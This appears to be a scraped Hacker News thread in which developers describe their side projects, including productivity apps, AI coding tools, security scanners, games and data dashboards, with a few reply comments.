    &lt;p&gt;Obsetico App (named after a friends' comment that "it's great for Obsessed people like my wife"&lt;/p&gt;
    &lt;p&gt;A mobile app to track tasks, events and any info about anything you care about: your car, home, tools, workshop, appliances, pets, lab equipment... anything really.&lt;/p&gt;
    &lt;p&gt;Lets you organize "resources" in a hierarchy (like "folders"). You can then define tasks, add pictures, geolocation, contacts, notes, events, etc to them. Recently added the feature to "share" resources with others.&lt;/p&gt;
    &lt;p&gt;I'm working on Happy Coder, an open source Codex and Claude Code native mobile app (plus a web app).&lt;/p&gt;
    &lt;p&gt;Happy lets you spawn and control multiple Codex/Claude Code sessions in parallel. Happy Coder runs on your hardware, works from your phone and desktop, costs nothing, End to End encrypted, and permissive MIT License.&lt;/p&gt;
    &lt;p&gt;Happy Coder is a unix style "do one thing well" project.&lt;/p&gt;
    &lt;p&gt;The goal is zero workflow disruption. I want to be able to run CLI coding agents on any internet connected computer, and control them with my phone. Happy has a command line wrapper for Codex and Claude Code that let you start a session in your terminal, and then continue it from your phone with real time sync. So type in your terminal and see it on the phone, type into your phone and see it in your terminal. So you can switch back and forth.&lt;/p&gt;
    &lt;p&gt;There is an optional voice agent some contributors have been hacking on that lets you talk to the voice agent first, and the voice agent then writes prompts for Codex/Claude Code and answers questions about what the coding agent running on your computer is doing/did. The voice agent feature is pretty neat, but in my opinion needs a bit more iteration, so any ideas or help would be awesome.&lt;/p&gt;
    &lt;p&gt;It looks like Markdown is having a bit of a heyday with it being the default mode of docs for AI coders. And it became apparent that there is no simple, but powerful Markdown viewer for the Mac, so I made one.&lt;/p&gt;
    &lt;p&gt;It supports all the usual Markdown formatting but also diagrams and equations so you can get Claude to not only write up your system docs but also supply a diagram of the database structure, logic, or AWS services.&lt;/p&gt;
    &lt;p&gt;It would be cool if you gave it a go :-) It is in the Mac app store "ViewMD"&lt;/p&gt;
    &lt;p&gt;I am working on Octelium https://github.com/octelium/octelium a FOSS unified zero trust secure access platform that is flexible enough to operate as a modern zero-config remote access VPN, a Zero Trust Network Access (ZTNA)/BeyondCorp platform, an API/AI/LLM gateway, an infrastructure for MCP gateways and agentic AI architectures/meshes, a PaaS-like platform, ngrok alternative, and even as a homelab infrastructure. It is basically a unified, generic, Kubernetes-like, zero trust architecture (ZTA) for secure access and deployment, that can operate in many human-to-workload, workload-to-workload, and hybrid environments.&lt;/p&gt;
    &lt;p&gt;I actually did a SHOW HN exactly 3 months ago and received lots of invaluable critique regarding how dense, overwhelming and unreadable the docs and repo README were. I've actually spent a lot of time trying to improve the quality of the docs and README since then. I'd love to receive any feedback, negative included, regarding the current overall quality of the docs and README from whoever is interest in that space.&lt;/p&gt;
    &lt;p&gt;In my free time I’m still working on My Financé (I keep getting feedback this name is confusing), which is a fairly undifferentiated personal finance tool.&lt;/p&gt;
    &lt;p&gt;It’s a labor of love, but I love it!&lt;/p&gt;
    &lt;p&gt;I’m currently building a simulation engine that lets you forecast your spending, build scenarios (like taking a year off, getting a cat, move to a new city, etc based on your current spending patterns and assets.&lt;/p&gt;
    &lt;p&gt;I don't know what it is about this name, but I read it as "My Fiancé". My brain did not register the first "n" and it wasn't until I read your parenthetical remark that I went back and re-read.&lt;/p&gt;
    &lt;p&gt;The name isn't confusing, per se ("get married to/be exclusive with your finances", OK), but it also isn't very strong... "financé" is also very strange and awkward to pronounce as a native English speaker. Probably because it comes across more as Spanish-seeming despite it being a play on a French work.&lt;/p&gt;
    &lt;p&gt;Cordyceps: A port of Playwight that doesn't use CDP or Chrome DevTools Protocol either over websockets or chrome.debugger. Instead it uses pure DOM and Chrome Extension APIs. It includes a port of both Stagehand and Browser Use that run purely inside the Chrome Extension. [0]&lt;/p&gt;
    &lt;p&gt;Doomberg Terminal: A Chrome Extension that performs algorithmic trading using Robinhood's web interface and market data. [1]&lt;/p&gt;
    &lt;p&gt;crx-mcp-over-cdp: This is a proof of concept demonstrating how to run a Model Context Protocol (MCP) server inside a Chrome Extension using Chrome DevTools Protocol (CDP) - no external server required. (Sort of, I left out the actual MCP library implementation. Ran out of time.) [2]&lt;/p&gt;
    &lt;p&gt;Still working on https://theretowhere.com, which is a website that makes it easier to find apartments and hotels/airbnbs close to people and activities you care about.&lt;/p&gt;
    &lt;p&gt;The past couple months have been fun since I've implemented a lot of new highly-requested features into the site's city heatmapping capabilities. One thing I've found motivating is having my own private changelog that shows screenshots of feature requests people have given me, and then dates for when I finally finished those features.&lt;/p&gt;
    &lt;p&gt;It's easy to forget how much stuff you've built in a month or two, sometimes.&lt;/p&gt;
    &lt;p&gt;WithAudio a one-time payment, desktop text-to-speech app that helps users read better by highlighting text as it's spoken.&lt;/p&gt;
    &lt;p&gt;Current Challenges:&lt;/p&gt;
    &lt;p&gt;Technical: It's difficult to consistently parse text from various document formats. The I also wants to expand to more platforms but I know I need to focus on marketing.&lt;/p&gt;
    &lt;p&gt;Non-technical: The product has seen some success with minimal marketing, but I keep getting distracted by spending too much time on technical work. I know I need to do more for marketing but I keep going to my safe space (my IDE).&lt;/p&gt;
    &lt;p&gt;I believe in the product but it keeps reminding me how difficult is to get somethig to a polished, finished state for all users. 90% of the project takes 90% of the time and the other 10% takes another 90% of the time.&lt;/p&gt;
    &lt;p&gt;Tinkering with a tiny macOS app that gives me proactive reminders about the low battery and imminent shutdown.&lt;/p&gt;
    &lt;p&gt;Standard system notification comes at about 10%, and most of the time, in my case at least, whenever I miss that, the result is "laptop shutdown amidst an ongoing video meeting" or something like that. (Basically, too late before I act)&lt;/p&gt;
    &lt;p&gt;Just so that I don't miss the reminders, the app will show an overlay window with some text, following my cursor, and a custom sound.&lt;/p&gt;
    &lt;p&gt;I built a version this weekend, and am current doing a dogfooding exercise.&lt;/p&gt;
    &lt;p&gt;I joined two current interests, my need to learn better JavaScript (since I never used it much) and the discovery of programs like PICO-8. I realize TIC-80 is basically the same but allows me to use other languages, so I’m trying to write small games using JS. I’m still on the struggle phase, trying to learn how to make sound effects, music etc. but I like the fact it comes with everything you need to create whatever you want. Also like how it makes you forget about all the giant software complexity nowadays.&lt;/p&gt;
    &lt;p&gt;I'm working on a video platform called Nickel. 5-second clips and 5-minute (max) videos. I've been slacking on development but realized recently that I lack focus and am easily distracted by other projects. I wrote about this yesterday.&lt;/p&gt;
    &lt;p&gt;I did figure out something I've long wondered about recently. Y'know how you can see previews of videos in Messages? I got it working! Here's an example video: https://nickel.video/6NI3n_IlIlII&lt;/p&gt;
    &lt;p&gt;My inspiration for Nickel was 1) missing Vine and 2) not wanting to use YouTube to share my gaming clips.&lt;/p&gt;
    &lt;p&gt;Adding a chat feature to my iOS app size analysis tool that runs locally on your Mac. My goal is to make everyone a build engineer, where you can chat with your builds and get insights and improvement areas. Testing out on-device Apple Intelligence models but need to find the time to do more validation testing.&lt;/p&gt;
    &lt;p&gt;Since a few months back I am working on a side project to give a snapshot of the regional and global species and natural ecosystems.&lt;/p&gt;
    &lt;p&gt;I use manual (me) and automated tools (web and literature search tools, llms, visualizers ...) to search, extract, organize and visualize ecosystem literature and data.&lt;/p&gt;
    &lt;p&gt;If there are some species that are you would like to see a snapshot of, and the region/location let me know and i will try to get a similar visualization. DM or as reply to the chat. Share the species name (common or scientific) and location (can be a city, town, region, province, country).&lt;/p&gt;
    &lt;p&gt;It is a work 8n progress, but I would be very happy to recieve feedback.&lt;/p&gt;
    &lt;p&gt;I appreciate what you're doing here. I think it's really important to have this kind of high level overview of these species. I have a little feedback based on clicking around the site.&lt;/p&gt;
    &lt;p&gt;When you click on a country in the map view(under Elephants, for example), I think the map still has focus instead of the card. So this means you can't highlight text, click on links, etc within the card. Also if you scroll using the scroll wheel, you end up zooming in and out on the map.&lt;/p&gt;
    &lt;p&gt;I wonder if it would be good to have a "see more" link or some such here, so you can view the same information in the card, but on its own discrete page for each country?&lt;/p&gt;
    &lt;p&gt;Really appreciate that you checked out the website. It is a bit hacky, but for now i am happy with it. Indeed that is correct, the focus is on the map. I am going to fix that. Thank you.&lt;/p&gt;
    &lt;p&gt;As for the see more, it is in my planning. I can do it manually, but I am waiting for some free time to automated that.&lt;/p&gt;
    &lt;p&gt;trying to build a webapp where i apply some recommender systems knowledge to TCG deckbuilding. MtG in particular is suffering from product fatigue and as someone who is both an MLE and a casual MtG player, it has been a fun challenge to apply my skills to a domain of interest&lt;/p&gt;
    &lt;p&gt;Working on Fraim, open-source agents for cloudsec and appsec engineers to complement existing deterministic scanners. Born out of our 3 years of learnings building such scanners for IaC. Turns out in the real world policies are subjective enough to make this hard.&lt;/p&gt;
    &lt;p&gt;Examples:&lt;/p&gt;
    &lt;p&gt;- Policies are frequently subjective. Hard to codify, but LLMs can evaluate them more like a security engineer would. "IAM policies should use least privilege." What is "least" enough? "Admin ports shouldn't be exposed to the Internet." What's an admin port?&lt;/p&gt;
    &lt;p&gt;- Security engineers are stretched thin. LLMs can watch PRs for potentially risky changes that need closer human review. "PR loosens authz/authn." "PR changes network perimeter configuration."&lt;/p&gt;
    &lt;p&gt;- Traditional check runs (SAST, IaC, etc.) flood PRs with findings. Security doesn't have time to review them all. Devs tends to ignore them. Frequent false positives. LLMs can draw attention to the important ones. "If the findings are unusual for this repo, require the author to acknowledge the risk before merging."&lt;/p&gt;
    &lt;p&gt;Emilia, a personal relationship manager. Every once in a while I meet extended family (wives of cousins or their children) or I meet a fellow soccer parent and I forget their names, or who's related to who.&lt;/p&gt;
    &lt;p&gt;I've used Monica HQ to keep track of this but thought I could tackle differently using AI. With AI you could ask questions like "who's everybody on my aunt's side? Like cousins and their family" and get a good answer.&lt;/p&gt;
    &lt;p&gt;Afaik other "relationship managers" out there are professionally oriented, for sales people. A lot of them talk about LinkedIn integration, for example.&lt;/p&gt;
    &lt;p&gt;Take a look at http://emilia-workers-website.inerte.workers.dev/ and if you're interested in Alpha testing, send me an email at inerte@gmail.com - I setup a Discord last week so early adopters can chat with me about.&lt;/p&gt;
    &lt;p&gt;MAXSTACK: Web framework for rapidly building SaaS apps with AI - trying to enable the next wave of 'fast-fashion saas'. Think of it like better-auth is doing for auth, I want to do for the rest of SaaS&lt;/p&gt;
    &lt;p&gt;- comes with common SaaS features pre-built (crud, blog, auth, etc.) - import templates from the framework until you want to customize them - create forms with just a zod schema - good docs, typescript interfaces, a CLI for common tasks, and MCP for your AI agent&lt;/p&gt;
    &lt;p&gt;If you're building something now or want to - I'd love to help. Could use the experience to make things easier through my framework.&lt;/p&gt;
    &lt;p&gt;(Will probably register a proper domain name close to release)&lt;/p&gt;
    &lt;p&gt;Historically, Astro hasn't had an API like renderToString for React/Vue/etc. that takes a component and renders it on the server. That changed with the release of the Container API last year: https://docs.astro.build/en/reference/container-reference/&lt;/p&gt;
    &lt;p&gt;But there are still a lot of rough edges:&lt;/p&gt;
    &lt;p&gt;- Importing components is a hassle (you have to go dig through the Astro manifest or create a TS file that exports all your components)&lt;/p&gt;
    &lt;p&gt;- No Vite integration (so no local dev support, or hot reload)&lt;/p&gt;
    &lt;p&gt;- No styling support (this is probably the biggest one)&lt;/p&gt;
    &lt;p&gt;Mighty will provide dev + styling support and a simple way to import your Astro components, with adapters for Hono and Laravel when first releasing. For Hono, it should be as simple as writing a few lines of code:&lt;/p&gt;
    &lt;p&gt;I’ve been working on https://fontofweb.com, a search engine for real-world web design.&lt;/p&gt;
    &lt;p&gt;Most design inspiration sites lean heavily on curated mockups (Dribbble) or award-winning showcases (Awwwards, Mobbin). That makes them polished, but they don’t reflect what most production sites actually look like. Font of Web takes a different approach: it sources directly from live websites, and the community can clip specific elements instead of entire pages. That means you can browse navbars, pricing cards, dashboards, etc., not just full screenshots.&lt;/p&gt;
    &lt;p&gt;Each clip is enriched with metadata (fonts, color palettes, original domain). Search works across that metadata, natural language queries (“minimalist fintech dashboard”), and even visual similarity — so you can find results either by text or by image.&lt;/p&gt;
    &lt;p&gt;There’s also a Chrome extension to snip and save from any site.&lt;/p&gt;
    &lt;p&gt;I’d like to hear from designers and frontend engineers: is this useful in your workflow? Anything obviously missing?&lt;/p&gt;
    &lt;p&gt;We are building an operating system for making sustainability compliance trivial. Currently we are using a combination of modern AI agents and traditional methods. If you are a hyperscaler or in a heavy industry or just need support for dealing with e.g. California's SB 253 and SB 261, shoot me a message.&lt;/p&gt;
    &lt;p&gt;I'm working on a product to break down information siloes for private market investors. A lot of data for private equity, private credit, and venture capital firms lives in memos, deal books, conversation notes, emails, and chats. In some cases, attempts to organize that data in a more structured format (e.g. using the CRM) has resulted in data not getting recorded because of the friction of managing those types of systems.&lt;/p&gt;
    &lt;p&gt;So basically, I'm building a system where users can query all of that unstructured data and add more with a little less friction.&lt;/p&gt;
    &lt;p&gt;I'm working to build a tool for macOS and Windows desktops to help non-technical users figure out what's wrong with their home internet and how to fix it. https://www.networkweather.com/&lt;/p&gt;
    &lt;p&gt;It's literally just me in the garage right now banging out prototypes, talking to MSPs, and probing networks/WiFi/OS to make this tool.&lt;/p&gt;
    &lt;p&gt;The hope is that companies care whether employees are productive when remote/hybrid/on-the-road, or at least are sick of trying to triage first line helpdesk tickets about home network issues and Zoom glitches.&lt;/p&gt;
    &lt;p&gt;Very close to releasing V3 of my Obsidian template vault with huge improvements, first class AI support, included Bases, a solid productivity system, and a ton more.&lt;/p&gt;
    &lt;p&gt;Trying to document my current hobby project, but stuck in the analysis phase. I dont even know what it is. When I try to describe its purpose I get blank looks. People tend to need physical demonstrations to understand whats going on. Its not entirely new, or novel, its definitely not revolutionary, but it is a hybrid of so many things, in a very indirect sense, that its just beyond my verbiage. Not a humble brag, I dont think its amazing or anything. I have just failed to describe it. Have been trying to get a phd I know to look at it, and describe it for me, but he just straight up isnt interested.&lt;/p&gt;
    &lt;p&gt;A command-line tool called berk that is a versatile job dispatcher written in c. It is meant to replace big clunky tools like Jenkins, Ansible etc. It has syntax similar to git. It works pretty well, just need to iron out some kinks before final release. https://github.com/jezze/berk&lt;/p&gt;
    &lt;p&gt;Currently working on https://rudys.ai to publish and optimise Google Ads campaigns on autopilot.&lt;/p&gt;
    &lt;p&gt;The idea is to be able to publish campaigns globally in any location/language and also get qualitative recommendations on what to improve. For example, if people have typos in their search terms, Rudy recommends to add it as a keyword so it can maximise the conversion.&lt;/p&gt;
    &lt;p&gt;Working on the Restful Atmos Sleep Lamp, a smart bedside lamp that automatically shifts throughout the day and night for the circadian rhythm, reducing blue light at night and maximizing blue light during the day. There is a machine learning layer that learns your preferences and automatically adjusts the intensity of the light, similarly to the Nest Thermostat [0].&lt;/p&gt;
    &lt;p&gt;Also, shipping Bedtime Bulb v2 next month. This is a hybrid LED-incandescent design meant for the evening that is the best of both worlds: low blue light, high color quality, perfect compatibility with dimmers, 10x less flicker than incandescent, includes near infrared, low energy use, long lifespan [1].&lt;/p&gt;
    &lt;p&gt;I'm working on a notes app that is as simple as Apple notes, but has native markdown support and uses semantic search.&lt;/p&gt;
    &lt;p&gt;Uses SwiftUI for the UI, and Zig does most of the heavy lifting on the backend. It's inspired by ghostty which uses a similar setup[1].&lt;/p&gt;
    &lt;p&gt;Right now it only works for Mac, but I'll be porting to iOS as soon as I get the markdown renderer polished. It's not available to the public yet, but I'm using it as my daily driver and hope to release it later this year. I've open sourced it so you can see the source code here[2].&lt;/p&gt;
    &lt;p&gt;A burnout detector for SREs. The goal is to help teams identify incident responders who may be overworked/getting burned out.&lt;/p&gt;
    &lt;p&gt;We are looking at:&lt;/p&gt;
    &lt;p&gt;-Objective data: signals from incident management tools (Rootly/PagerDuty), GitHub, and Slack&lt;/p&gt;
    &lt;p&gt;-Self-reported data: asking the engineers how they feel via short survey&lt;/p&gt;
    &lt;p&gt;From this, we generate a CBI score (Copenhagen Burnout Inventory). We're still in beta, but we've received positive feedback from our beta testers, especially from manager of large and distributed orgs.&lt;/p&gt;
    &lt;p&gt;Diplomium helps educators and event organizers create and deliver authenticated certificates at scale. Instead of manually designing and emailing PDFs, you upload a simple Excel, pick a template, and the system generates + sends personalized certificates automatically—each with a unique QR code for instant validation.&lt;/p&gt;
    &lt;p&gt;The bigger picture: Certificates are often the only tangible outcome of a learning experience. By making them verifiable, permanent, and easy to distribute, organizations save admin time while learners get a trustworthy credential.&lt;/p&gt;
    &lt;p&gt;Status: Running for 2 years, used by schools and training centers in Latin America. Now building AI-powered features for design editing and data extraction from PDFs.&lt;/p&gt;
    &lt;p&gt;Been exploring the amazing GCAT space dataset - it’s been a good way to drive some dashboard feature experimentation using fun data. Still need to work on my dashboard design skills, though.&lt;/p&gt;
    &lt;p&gt;I am working on a tiny cli project, tascli: https://github.com/Aperocky/tascli, a local fast and simple personal task and record manager. Specifically, I need to update it to support recurring task and records.&lt;/p&gt;
    &lt;p&gt;I'm converting PG's essays into latex. It generates 4 "volumes", each with it's own mobile + PDF. It's still early, but am really happy with it so far!&lt;/p&gt;
    &lt;p&gt;Scrolling Stock Price "LED" Ticker for Windows. I could never find one that did what I wanted so with the help of Copilot I built my own. Still has some bugs I am working on but I would love some feedback!&lt;/p&gt;
    &lt;p&gt;I'm working a coding agent, named VT Code. It is a Rust-based terminal coding agent with semantic code understanding powered by tree-sitter and ast-grep, and fully configurable and open-source.&lt;/p&gt;
    &lt;p&gt;I had been unemployed for a year and worked a lot on DiffKeep (https://github.com/DiffKeep/DiffKeep), a cross platform AI generated image management program. Fortunately / unfortunately I got a job and haven't been able to dedicate much time to it lately.&lt;/p&gt;
    &lt;p&gt;I had problems sharing my photos on Instagram so I made an alternative: https://phofee.com/&lt;/p&gt;
    &lt;p&gt;I made an install script for Arch Linux that sets up the bare essentials for a new install. You can fork it and edit it to your own liking. https://github.com/QCgeneral29/AIP&lt;/p&gt;
    &lt;p&gt;Banker (banker.so): An AI spreadsheet that excels at spreadsheet understanding (pun intended).&lt;/p&gt;
    &lt;p&gt;There are some AI spreadsheet products out there mostly as plugins along with MS Copilot. However my experience with them showed that they are bad at understanding spreadsheets.&lt;/p&gt;
    &lt;p&gt;The reason is that sheets are 2D data models. Because LLMs are trained on 1D data models (simply text), translation of 2D data models to formats an LLM can consume is a big context engineering task.&lt;/p&gt;
    &lt;p&gt;I read and implemented some of the algos mentioned in SpreadsheetLLM paper released by Microsoft. Ironic, isn't it?&lt;/p&gt;
    &lt;p&gt;Got it to a nice working state. Give it a go - if you need more tokens, let me know!&lt;/p&gt;
    &lt;p&gt;- A super easy-to-install monitoring tool that doesn’t require bash scripts or config files&lt;/p&gt;
    &lt;p&gt;- A mobile-friendly, UX-first interface where I can check everything from my phone&lt;/p&gt;
    &lt;p&gt;It’s now pretty feature complete. I can see a full picture of all the servers and VPS I run straight from my phone.&lt;/p&gt;
    &lt;p&gt;Setup is one command, no config files, and everything else happens in the UI. There’s a catalog of predefined alert rules, and creating new ones is easier than anything else I’ve used.&lt;/p&gt;
    &lt;p&gt;Thinking about vibe coding a Behaviour Change App as opposed to a simple habit tracking app. I have personally used the habit tracking apps, and they are absolutely useless. My app will help the users learn how to actually change their behaviour, teaching them micro skills like value alignment, self-compassion, etc. These micro skills will help them in all aspects of their life and mainly to change bad habits.&lt;/p&gt;
    &lt;p&gt;It gives you precise control over every shade/tint (no AI or auto generation!) so you can incorporate your own brand colors, and helps you build palettes that have simple to follow color contrast guarantees by design e.g. all grade 600 colors have 4.5:1 WCAG contrast (for body text) against all grade 50 colors, such as red-600 vs gray-50, or green-600 vs gray-50. There's export options for plain CSS, Tailwind, Figma, and Adobe.&lt;/p&gt;
    &lt;p&gt;I'm really open to feedback on what problems and needs people have for creating accessible designs!&lt;/p&gt;
    &lt;p&gt;I'm working on a WordPress PaaS with dedicated lanes for bots. The status quo around WordPress is that you block bots using Cloudflare, else your site crashes. Since AI search is here to stay, we need a way to let bots crawl WordPress sites without crashing the server.&lt;/p&gt;
    &lt;p&gt;I'm working on a site for filmmakers to help showcase themselves!&lt;/p&gt;
    &lt;p&gt;Why? &amp;gt;&lt;/p&gt;
    &lt;p&gt;LinkedIn isn't for creatives. Actor's Access is dated and charges a ton for basic extras Squarespace/wix is fine but everyone in 'the biz' has one and nobody wants to maintain it. Plus they're all silo'd.&lt;/p&gt;
    &lt;p&gt;Check out my site if you wanna. You get to host your own headshots, resume, and reels. You can upload your screenplay there and hear it read outloud. You can put up your cinematic scores and make a place to send people to hear your music.&lt;/p&gt;
    &lt;p&gt;I'm trying to get my agentic software specification tool Arbiter to release (UI polish/debugging is so slow :/, browser shenanigans are harder than Rust fr). It's basically a tool that AI agents can use to construct a project specification. The twist to Arbiter is that the specs are structured and validated, and you can compile them to get:&lt;/p&gt;
    &lt;p&gt;Services with stubbed endpoints, UIs with placeholder components, Dockerfiles/Terraform/K8s infra, E2E tests (via declared flows), Github/Gitlab epics/issues/subissues&lt;/p&gt;
    &lt;p&gt;It's also got github/gitlab webhook integration, so you can do stuff like trigger agents reactively when events occur on a repo, it includes cloudflare tunnel support so you can set up webhooks even in a local dev environment, and the project generator is fully customizable.&lt;/p&gt;
    &lt;p&gt;Nope, it's a structured spec agents construct using a CLI or MCP (you can also interact with the spec using a web UI). It's CUE, and validated against a schema. Instead of taking your conversation and generating a markdown document that agents might (but often don't) respect, the agent populates the spec in the service from your conversation, then when you're done you can use the CLI to automatically generate a bunch of code.&lt;/p&gt;
    &lt;p&gt;I've been building an LLM powered map for the last 6 months. I'm working to reinvent how mapping applications interact with geocoders and routing engines to make much more powerful and easy to use map applications!&lt;/p&gt;
    &lt;p&gt;Building https://multi.dev, an AI coding agent with bunch of FOSS contributors&lt;/p&gt;
    &lt;p&gt;We took a great amount of learning from tools like Cline, Roo.. After spending some time on their tech as active users/devs, we decided to build multi from scratch with drastically different take on core features, tech stack, ux/devex..&lt;/p&gt;
    &lt;p&gt;If you are an active user of similar tools, and/or want to try multi.. We want to hear from you.&lt;/p&gt;
    &lt;p&gt;-- edit: I am one of the core contributors to multi. And we are in the process of open sourcing it.&lt;/p&gt;
    &lt;p&gt;Codexes Factory: algorithmic tools to create, operate, distribute, and market entire publishing imprints. This week I am launching my first imprint, Xynapse Traces, with 66 books in the Korean pilsa (筆寫) style. Later in October, Nimble Ultra, devoted to the history and practice of intelligence and espionage. Last week I built a giant collection of 575 imprints that are a shadow superset of the ~540 imprints operated by the Big Five publishing houses (Penguin Random House, the largest has ~300). Teeny weeny tip of the iceberg at NimbleBooks.com.&lt;/p&gt;
    &lt;p&gt;I'm building with python/fastapi, react/tailwind/vite, with Claude Code and using test-driven development.&lt;/p&gt;
    &lt;p&gt;Red-green-refactor is tedious for humans but perfect for AI. And the test names &amp;amp; code make great documentation of every micro decision, running in milliseconds to prevent regressions.&lt;/p&gt;
    &lt;p&gt;The software itself helps people perform construction approvals.&lt;/p&gt;
    &lt;p&gt;Old way: dozens of documents and versions sent back and forth over email. Many fiddly details that must be checked - to streamline the process we'll use AI to provide verdicts that help humans make decisions.&lt;/p&gt;
    &lt;p&gt;I plan to create content &amp;amp; teach what I've learned.&lt;/p&gt;
    &lt;p&gt;I am all-in on a Unity game right now. Working with one other person and hoping to ship to Steam later this year.&lt;/p&gt;
    &lt;p&gt;Thinking about play testing at scale is a new thing for me. I've been getting into visualization techniques like using 3d textures to build voxel heat maps in-editor. We've managed to accumulate quite a bit of play testing telemetry already. The power of aggregated statistics in the editor views is absolutely mind-blowing to me. For level designers it's like having proper omniscience. Being able to see things like thousands of samples (manifesting as a bright red voxel) that wound up tripping over the same misplaced geometry is like cheating.&lt;/p&gt;
    &lt;p&gt;I’m building an ETL tool that “just works” and gets out of the way. I can write shell scripts and python to do this stuff but honestly I just want to drop my files/API results into a GUI tool and have it combine things for me. Landing page is at https://eetle.com&lt;/p&gt;
    &lt;p&gt;Building https://pneumatter.com to explore embodying articles of Programmable Architecture (self-assembling buildings)which are weather-compliant, resource generating, and optionally permanent.&lt;/p&gt;
    &lt;p&gt;I'm working on Matry - it's a tool for designing in the browser. It's kind of like a cross between Webflow, Vim, Storybook, and Cursor. I'm trying to strike a fine balance that I don't see in existing tools.&lt;/p&gt;
    &lt;p&gt;Nothing to demo yet, but hopefully I'll have something soon.&lt;/p&gt;
    &lt;p&gt;i've been incrementally hiking the via francigena (https://www.viefrancigene.org/en/walking/) and am working through integrating my gpx, geotagged photos, and oura ring data to both illustrate my journey and analyze how different terrains and altitudes affected the collected biometrics.&lt;/p&gt;
    &lt;p&gt;ingesting/parsing gpx layers into duckdb using python to extract tags and load api data. using minio right now but ultimately want to push to cloudflare free tools or vercel.&lt;/p&gt;
    &lt;p&gt;An “everything” feed reader. Its a plugable framework that allows you to push anything into an RSS feed reader type interface. Email, Slack notifications, RSS, etc.&lt;/p&gt;
    &lt;p&gt;I want one place to manage ALL notification settings. So if I want to be notified of Slack messages that contain the word “cat”, I can do that.&lt;/p&gt;
    &lt;p&gt;I am also looking to add summarization and tagging using a local SLM. Trying to find a method that can run on older hardware.&lt;/p&gt;
    &lt;p&gt;I'm working on a new CAPTCHA designed to be very simple and user-friendly for humans, while maintaining strong LLM bot protection. I'm currently looking for pilot users (content creators, site owners, or anyone interested) to test it out and provide feedback. If you're interested, please comment.&lt;/p&gt;
    &lt;p&gt;I’m working on Colanode, which is built to close the gap between the convenience of cloud tools and the ownership of local software. It brings chat, docs, databases, and files into one open-source, self-hostable workspace where data lives on your devices first and syncs in the background. Unlike typical SaaS tools, Colanode is local-first: everything works instantly and offline, infrastructure stays minimal, and you keep full control of your data.&lt;/p&gt;
    &lt;p&gt;Picshift.io: upload an image, get a URL, change what shows at that URL whenever you want. Works anywhere an image link works.&lt;/p&gt;
    &lt;p&gt;You can randomize and schedule images to show up at the link as well. Super useful for marketing, maintaining screenshots on a website or in documentation, etc.&lt;/p&gt;
    &lt;p&gt;Improving my 'Video game generator from photos'. The bottleneck of this kind of generator is 'how much time to obtain the video game". I managed on my last vacation (it's a side project) to reduced it to 2 hours. This is an example of one FPS made by my tool : https://free-visit.net/fr/demo01&lt;/p&gt;
    &lt;p&gt;I'm vibe coding using GitHub Copilot and JetBrains AI Pro on a Blazor web app that tracks my investment in like index funds, stocks, ETFs, etc. It's a simple CRUD web app.&lt;/p&gt;
    &lt;p&gt;The app is nearly completed, and Grok (preview in Copilot, currently free) wrote most of the CRUD pages with Entity Framework. Of course, it does get things wrong, and I use Claude 4 to fix the issues. (i'm a C# dev, I review code generated by Grok sometimes.)&lt;/p&gt;
    &lt;p&gt;Everyone’s drowning in long articles, dense PDFs, and hour-long videos. I’m working on https://unrav.io , it lets you flip any article, paper, or YouTube link into the format you actually want (summary, mindmap, podcast, infographic, etc.) in one click.&lt;/p&gt;
    &lt;p&gt;Right now I’m experimenting with a simple bookmarklet trigger instead of a browser extension. Curious: how do HN folks feel about bookmarklets in 2025, still viable, or do you prefer extensions?&lt;/p&gt;
    &lt;p&gt;It focused on critical thinking and communication skills by having dialogues about recent news and announcements at the companies you want to work at. Have a 2 min dialogue and get feedback about how you think and speak.&lt;/p&gt;
    &lt;p&gt;Yep, you read it right. 0 false positives. We scan the whole codebase for possible vulnerabilities, rank them, write the proof-of-concept for exploitation, spin up the software in a sandbox, and then attack. All of them happen autonomously without human involvement.&lt;/p&gt;
    &lt;p&gt;The end report? Only verified vulnerabilities are being reported without noise.&lt;/p&gt;
    &lt;p&gt;Already reported some unknown vulnerabilities in open source projects. The good thing is we're just getting started.&lt;/p&gt;
    &lt;p&gt;I am a bit of a checklist nerd, so I wrote a web app do to checklists: https://checkoff.ai&lt;/p&gt;
    &lt;p&gt;As it is fashionable these days, it can create checklists with AI ("Fun things to do in Pittsburg"), you can create checklists from templates (some stuff you do every day), etc.&lt;/p&gt;
    &lt;p&gt;I also have an MCP server that allows you to plug it into your favorite LLM.&lt;/p&gt;
    &lt;p&gt;I created a 2D platformer inspired by the classic Mario games. The game is called Jolly Land Adventure and I made it because I wanted a simple platformer that's easy to just pick up and play.&lt;/p&gt;
    &lt;p&gt;The game is available on Steam for Windows, Mac and Linux. The demo contains the entire first episode with 30 levels for anyone who wants to try it out.&lt;/p&gt;
    &lt;p&gt;I've been working on LogChef (https://logchef.app) - a specialized log analytics UI for ClickHouse that focuses on powerful querying and exploration without the complexity of full observability platforms.&lt;/p&gt;
    &lt;p&gt;The core idea is to leverage ClickHouse's incredible columnar performance for log analytics while providing a schema-agnostic interface that works with any log table structure. It supports both simple search syntax for quick queries and full ClickHouse SQL for complex analytics. Also it has proper RBAC: Team-based access controls for multi-tenant environments.&lt;/p&gt;
    &lt;p&gt;Off late I have also added some AI features:&lt;/p&gt;
    &lt;p&gt;- AI-powered SQL generation - write queries in natural language - MCP (Model Context Protocol) server integration for AI assistants to query your logs&lt;/p&gt;
    &lt;p&gt;It's open source (AGPLv3) and deliberately doesn't handle log collection - instead it integrates with existing tools like Vector, Fluentd, or OpenTelemetry Collector. The roadmap includes REST APIs, client libraries, visualizations, and alerting.&lt;/p&gt;
    &lt;p&gt;Built with Go + Vue.js + TypeScript. Currently handles millions of log entries daily in production environments at my org. The deployment is just a single binary deployment with a SQLite DB.&lt;/p&gt;
    &lt;p&gt;It's a personal knowledge system. It's a zettelkasten with an LLM substrate. It uses LLMs to build a model of the theses, arguments and facts used in cards, and uses these to both summarize the information on the card and to automatically link cards together based on shared concepts.&lt;/p&gt;
    &lt;p&gt;Working on a "Data Governance in a Box" solution for small businesses that are using out of data routers and security practices. Starting here in Canada, but open to collaboration.&lt;/p&gt;
    &lt;p&gt;Building AI workbench and tools for Home Service Business verticals. I found there is a lot of waste in targeting and workflows for business, focussing on improving them with advanced YOLO and LLM models.&lt;/p&gt;
    &lt;p&gt;I've been sculpting a static site generator for myself in TypeScript. The focus is on accessible, clean, and semantic output. It's one of those endless projects but it's fun to work on.&lt;/p&gt;
    &lt;p&gt;I just shipped 3pio, a drop-in test runner that context-optimizes your test output. It uses your existing test runner and tests so zero changes to your codebase or tooling to use it.&lt;/p&gt;
